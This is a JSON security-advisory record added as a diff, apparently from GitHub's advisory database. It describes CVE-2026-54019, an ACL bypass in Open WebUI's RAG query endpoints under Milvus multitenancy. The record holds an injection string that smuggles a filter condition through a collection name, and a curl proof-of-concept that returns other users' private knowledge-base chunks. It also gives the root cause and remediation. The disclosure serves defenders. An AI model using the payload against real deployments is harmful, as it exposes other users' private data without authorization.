@@ -1,0 +1,103 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-54019",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862",
+      "CWE-943"
+    ],
+    "description": "# RAG ACL Bypass in Milvus Multitenancy Mode\n\n## Summary\n\nThis is a bypass of the fix for:\n\n- GHSA-h36f-rqpx-j5wx\n- CVE-2026-44560\n- \"Unauthorized File and Knowledge Base Content Access via RAG Vector Search\"\n\nOpen WebUI added collection-level ACL checks, but the patch can still be bypassed when Milvus multitenancy mode is enabled. The ACL allows unknown non-KB collection names as legacy/ephemeral collections. In Milvus multitenancy mode, that user-controlled collection name becomes a `resource_id` and is interpolated into a Milvus expression without escaping.\n\nAn authenticated non-admin user can query:\n\n```text\nx' or resource_id != '' or resource_id == 'x\n```\n\nThis passes the Open WebUI ACL as an unknown collection, but Milvus evaluates:\n\n```text\nresource_id == 'x' or resource_id != '' or resource_id == 'x'\n```\n\nThat returns private knowledge-base chunks belonging to other users.\n\n## Affected Configuration\n\nTested on:\n\n```text\nOpen WebUI: v0.9.5, commit 3660bc00f\nVECTOR_DB=milvus\nENABLE_MILVUS_MULTITENANCY_MODE=true\n```\n\nThis is **not a default-vector-store issue**. It affects **production deployments using Milvus multitenancy.**\n\n## Impact\n\nAn authenticated low-privilege user can read private RAG / knowledge-base content they do not have access to. No victim interaction is required.\n\n## Root Cause\n\nACL permits unknown collection names:\n\n```python\n# backend/open_webui/retrieval/utils.py\nelif not await Knowledges.get_knowledge_by_id(name):\n    validated.add(name)\n```\n\nMilvus multitenancy then treats the same name as `resource_id` and builds unsafe expressions:\n\n```python\n# backend/open_webui/retrieval/vector/dbs/milvus_multitenancy.py\nexpr=f\"{RESOURCE_ID_FIELD} == '{resource_id}'\"\n```\n\nAffected paths include:\n\n```text\nPOST /api/v1/retrieval/query/collection\nPOST /api/v1/retrieval/query/doc\n```\n\n## PoC\n\nRequest:\n\n```bash\ncurl -s -X POST \"$TARGET/api/v1/retrieval/query/collection\" \\\n  -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  --data-binary @- <<'JSON'\n{\n  \"collection_names\": [\n    \"x' or resource_id != '' or resource_id == 'x\"\n  ],\n  \"query\": \"anything\",\n  \"k\": 10,\n  \"hybrid\": false\n}\nJSON\n```\n\nActual result: private chunks from other users' knowledge collections are returned.\n\nExpected result: request should be rejected with 403 or return no unauthorized content.\n\n## Remediation\n\n1. Do not allow arbitrary unknown collection names in user-controlled RAG query endpoints.\n2. Escape or parameterize Milvus expression values before building filters.\n3. Reject collection names containing quotes/control characters unless they match a known internal format.\n4. Add a regression test for this payload in Milvus multitenancy mode:\n\n```text\nx' or resource_id != '' or resource_id == 'x\n```",
+    "ghsa_id": "GHSA-p5cp-r7rg-qpxc",
+    "html_url": "https://github.com/advisories/GHSA-p5cp-r7rg-qpxc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-p5cp-r7rg-qpxc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54019"
+      }
+    ],
+    "published_at": "2026-06-17T17:57:43Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-p5cp-r7rg-qpxc",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-54019",
+      "https://github.com/advisories/GHSA-p5cp-r7rg-qpxc",
+      "https://github.com/open-webui/open-webui",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2750.yaml",
+      "https://pypi.org/project/open-webui"
+    ],
+    "severity": "medium",
+    "summary": "Open WebUI: RAG ACL Bypass in Milvus Multitenancy Mode",
+    "updated_at": "2026-07-20T21:08:22Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.6",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "<= 0.9.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-p5cp-r7rg-qpxc",
+  "repo": {
+    "cve_id": "CVE-2026-54019",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862",
+      "CWE-943"
+    ],
+    "description": "# RAG ACL Bypass in Milvus Multitenancy Mode\r\n\r\n## Summary\r\n\r\nThis is a bypass of the fix for:\r\n\r\n- GHSA-h36f-rqpx-j5wx\r\n- CVE-2026-44560\r\n- \"Unauthorized File and Knowledge Base Content Access via RAG Vector Search\"\r\n\r\nOpen WebUI added collection-level ACL checks, but the patch can still be bypassed when Milvus multitenancy mode is enabled. The ACL allows unknown non-KB collection names as legacy/ephemeral collections. In Milvus multitenancy mode, that user-controlled collection name becomes a `resource_id` and is interpolated into a Milvus expression without escaping.\r\n\r\nAn authenticated non-admin user can query:\r\n\r\n```text\r\nx' or resource_id != '' or resource_id == 'x\r\n```\r\n\r\nThis passes the Open WebUI ACL as an unknown collection, but Milvus evaluates:\r\n\r\n```text\r\nresource_id == 'x' or resource_id != '' or resource_id == 'x'\r\n```\r\n\r\nThat returns private knowledge-base chunks belonging to other users.\r\n\r\n## Affected Configuration\r\n\r\nTested on:\r\n\r\n```text\r\nOpen WebUI: v0.9.5, commit 3660bc00f\r\nVECTOR_DB=milvus\r\nENABLE_MILVUS_MULTITENANCY_MODE=true\r\n```\r\n\r\nThis is **not a default-vector-store issue**. It affects **production deployments using Milvus multitenancy.**\r\n\r\n## Impact\r\n\r\nAn authenticated low-privilege user can read private RAG / knowledge-base content they do not have access to. No victim interaction is required.\r\n\r\n## Root Cause\r\n\r\nACL permits unknown collection names:\r\n\r\n```python\r\n# backend/open_webui/retrieval/utils.py\r\nelif not await Knowledges.get_knowledge_by_id(name):\r\n    validated.add(name)\r\n```\r\n\r\nMilvus multitenancy then treats the same name as `resource_id` and builds unsafe expressions:\r\n\r\n```python\r\n# backend/open_webui/retrieval/vector/dbs/milvus_multitenancy.py\r\nexpr=f\"{RESOURCE_ID_FIELD} == '{resource_id}'\"\r\n```\r\n\r\nAffected paths include:\r\n\r\n```text\r\nPOST /api/v1/retrieval/query/collection\r\nPOST /api/v1/retrieval/query/doc\r\n```\r\n\r\n## PoC\r\n\r\nRequest:\r\n\r\n```bash\r\ncurl -s -X POST \"$TARGET/api/v1/retrieval/query/collection\" \\\r\n  -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  --data-binary @- <<'JSON'\r\n{\r\n  \"collection_names\": [\r\n    \"x' or resource_id != '' or resource_id == 'x\"\r\n  ],\r\n  \"query\": \"anything\",\r\n  \"k\": 10,\r\n  \"hybrid\": false\r\n}\r\nJSON\r\n```\r\n\r\nActual result: private chunks from other users' knowledge collections are returned.\r\n\r\nExpected result: request should be rejected with 403 or return no unauthorized content.\r\n\r\n## Remediation\r\n\r\n1. Do not allow arbitrary unknown collection names in user-controlled RAG query endpoints.\r\n2. Escape or parameterize Milvus expression values before building filters.\r\n3. Reject collection names containing quotes/control characters unless they match a known internal format.\r\n4. Add a regression test for this payload in Milvus multitenancy mode:\r\n\r\n```text\r\nx' or resource_id != '' or resource_id == 'x\r\n```",
+    "ghsa_id": "GHSA-p5cp-r7rg-qpxc",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-p5cp-r7rg-qpxc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-p5cp-r7rg-qpxc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54019"
+      }
+    ],
+    "published_at": "2026-06-11T19:09:52Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "RAG ACL Bypass in Milvus Multitenancy Mode",
+    "updated_at": "2026-06-11T19:09:52Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.6",
+        "vulnerable_version_range": "<= 0.9.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
